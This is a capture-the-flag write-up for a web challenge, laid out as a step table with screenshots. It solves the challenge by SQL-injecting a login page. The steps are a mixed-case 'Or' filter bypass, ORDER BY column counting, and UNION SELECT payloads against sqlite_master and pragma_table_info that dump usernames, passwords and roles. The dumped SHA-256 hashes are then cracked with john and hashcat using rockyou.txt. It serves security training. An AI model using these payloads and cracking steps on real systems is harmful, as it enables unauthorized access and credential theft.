# Bit tricky SQL

- **Category**: Web  
- **Solution**: Bypass character check → build SQL → crack password

---

| Step | Screenshot |
|------|------------|
| 1. Access the login page. | <img width="600" height="399" alt="image" src="https://github.com/user-attachments/assets/b6a78576-cfa9-4a45-833d-5949600dd717" /> |
| 2. Test a basic SQL injection:<br>`' OR 1 = 1 --` (fails) | <img width="600" height="152" alt="image" src="https://github.com/user-attachments/assets/478817a1-30a0-4289-a449-2f8465e56ea3" /><br><img width="600" height="75" alt="image" src="https://github.com/user-attachments/assets/77fbfe52-610e-4b84-a96c-47eeadedecee" /> |
| 3. Try to bypass the filter:<br>Check `or`, `and`, `AND` ... finally **`Or` (capital O, lowercase r)** works | <img width="391" height="133" alt="image" src="https://github.com/user-attachments/assets/f8994442-e981-45b2-ac6e-2e95ccf2b0a4" /><br><img width="600" height="297" alt="image" src="https://github.com/user-attachments/assets/789b117f-28fb-4170-bd25-00309e303653" /> |
| 4. Check the page for a **HINT**. | <img width="600" height="204" alt="image" src="https://github.com/user-attachments/assets/55f54fd0-354b-4ab1-8c47-1238e6238f31" /> |
| 5. Find the number of columns:<br>```' ORDER BY [number] --```<br>Found columns number: 7 | <img width="600" height="1014" alt="sql1" src="https://github.com/user-attachments/assets/2cf3133b-586a-417e-982f-bdd54d4f660c" /> |
| 6. Identify the database type:<br>Hint: *Lightweight DB* → **SQLite** | <img width="600" height="452" alt="image" src="https://github.com/user-attachments/assets/54a6a642-fdbf-4b7e-8e51-8576b9b27116" /> |
| 7. SQLite has no traditional DB name (file-based).<br>Enumerate **table names** using `sqlite_master`. | <img width="600" height="408" alt="image" src="https://github.com/user-attachments/assets/8c4df384-36ba-43eb-9b1f-9d7aa4d62f6e" /><br><img width="600" height="527" alt="image" src="https://github.com/user-attachments/assets/2a1aa752-378f-4239-9466-2af78cdfdd72" /> |
| 8. Extract table names from `sqlite_master`:<br>```' UNION SELECT null, name, null, null, null, null, null FROM sqlite_master --```<br>Found table: **`NCTFDBUsers`** | <img width="600" height="1010" alt="sql2" src="https://github.com/user-attachments/assets/1a1a2572-e661-4ba5-9d7e-d71cbe6500a3" /> |
| 9. Enumerate columns using pragma_table_info:<br>' UNION SELECT null, name, null, null, null, null, null FROM pragma_table_info('NCTFDBUsers') --<br>Found columns: **username, password, role, ...**<br>After that, if you try changing the columns, it seems that the 2, 4, and 5 columns are displayed. | <img width="600" height="289" alt="image"　src="https://github.com/user-attachments/assets/40f4bda5-fe9d-4e17-a509-393acc4c972b" /><br>[pragma table_info](https://sqlite.org/pragma.html) | 
| 10. Enumerate username, password, and role:<br>' UNION SELECT null, username, null, password, role, null, null FROM NCTFDBUsers --<br>We found the **admin user** and another user whose password is stored in plaintext.<br>youwillrockyou?<br><br>👉 To crack the hashed password later, we will need a **rockyou.txt**.  You can find how to download it by searching *“download rockyou.txt”* on Google or AI. | <img width="600" height="588" alt="sql3" src="https://github.com/user-attachments/assets/14ec5b41-8926-4db1-8835-1f6ab80f81ba" /> |
| 11. Export the usernames and passwords to a text file.<br>Edit ○○.txt like this.<br>Identify the hash using tools or [online services](https://hashes.com/en/decrypt/hash).<br>Found hash type: **SHA-256** | <img width="600" height="259" alt="image" src="https://github.com/user-attachments/assets/6b988360-57ec-44ea-ae3a-e115aabb2e11" /> | 
| 12. Crack the passwords using john (or hashcat).<br>Before cracking, prepare the file so that it only contains the needed username & hash pair.<br>For example:<br>`awk 'NR>1{print $1":"$2}' hash.txt > newhash.txt`<br><br>Then run the cracking tool john,hashcat etc..:<br>```john --format=raw-256 --wordlist=./rockyou.txt newhash.txt``` or ```hashcat -m 1400 -a 0 newhash.txt rockyou.txt```|<img width="600" height="245" alt="image" src="https://github.com/user-attachments/assets/d91766e4-1885-4e71-9e3f-542cd8d4ffd9" /><img width="600" height="351" alt="image" src="https://github.com/user-attachments/assets/9d9d9b35-7758-4098-a3bc-6c54ba4c2db4" />|
| 13. Login as administrator.<br>🎉 Congratulations! You got the flag. | <img width="384" height="302" alt="image" src="https://github.com/user-attachments/assets/13622d75-9323-4efa-ad2e-7061ab205720" /> |

